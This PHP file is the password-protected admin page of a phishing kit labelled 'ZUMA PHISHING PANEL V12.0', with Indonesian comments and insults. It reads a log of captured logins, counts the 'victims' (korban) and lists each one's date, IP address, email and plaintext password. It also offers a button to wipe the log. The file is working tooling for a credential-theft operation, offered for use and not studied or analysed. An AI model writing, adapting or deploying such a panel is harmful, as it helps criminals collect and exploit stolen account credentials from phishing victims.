<?php
// view.php - Panel liat hasil

// Proteksi pake password sederhana
$panel_password = 'zuma123';

// Cek login
if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $panel_password) {
    header('WWW-Authenticate: Basic realm="ZUMA PANEL"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Login dulu, kontol!';
    exit;
}

// Tampilkan data
echo '<!DOCTYPE html>
<html>
<head>
    <title>ZUMA PHISHING PANEL</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #00ff00; color: black; padding: 10px; }
        td { border: 1px solid #00ff00; padding: 8px; }
        .stats { margin: 20px 0; padding: 10px; border: 1px solid #00ff00; }
    </style>
</head>
<body>
    <h1>📊 ZUMA PHISHING PANEL V12.0</h1>';

if(file_exists('logs.txt')) {
    $lines = file('logs.txt');
    echo '<div class="stats">📌 Total Korban: ' . count($lines) . '</div>';
    
    echo '<table>
        <tr>
            <th>No</th>
            <th>Tanggal</th>
            <th>IP</th>
            <th>Email</th>
            <th>Password</th>
        </tr>';
    
    $no = 1;
    foreach(array_reverse($lines) as $line) {
        if(preg_match('/\[(.*?)\] IP: (.*?) \| Email: (.*?) \| Password: (.*?) \|/', $line, $match)) {
            echo '<tr>';
            echo '<td>' . $no++ . '</td>';
            echo '<td>' . $match[1] . '</td>';
            echo '<td>' . $match[2] . '</td>';
            echo '<td>' . htmlspecialchars($match[3]) . '</td>';
            echo '<td>' . htmlspecialchars($match[4]) . '</td>';
            echo '</tr>';
        }
    }
    echo '</table>';
} else {
    echo '<p>Belum ada data, kontol!</p>';
}

echo '<p><a href="?clear=1" style="color:#ff0000;" onclick="return confirm(\'Yakin hapus?\')">🗑️ Hapus Semua Data</a></p>';

// Fitur hapus
if(isset($_GET['clear'])) {
    file_put_contents('logs.txt', '');
    echo '<script>alert("Data dihapus!"); window.location.href="view.php";</script>';
}

echo '</body>
</html>';
?>